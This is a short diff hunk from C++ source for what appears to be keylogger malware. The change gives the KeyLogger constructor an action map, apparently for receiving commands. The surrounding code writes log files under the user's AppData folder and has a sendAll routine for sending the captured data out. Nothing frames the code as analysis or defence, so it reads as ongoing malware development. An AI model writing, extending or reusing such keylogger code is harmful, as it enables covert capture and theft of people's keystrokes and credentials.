@@ -210,7 +210,7 @@ void KeyLogger::sendAll() {
 }
 
 
-KeyLogger::KeyLogger(const Stream & stream) : Sender(stream) {
+KeyLogger::KeyLogger(const Stream & stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap) : Sender(stream, actionMap) {
 #ifdef KEYLOGGER_DEF
     pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(KEYLOGGER_DEF) + L"\\";
     logsFileName = generateLogName();
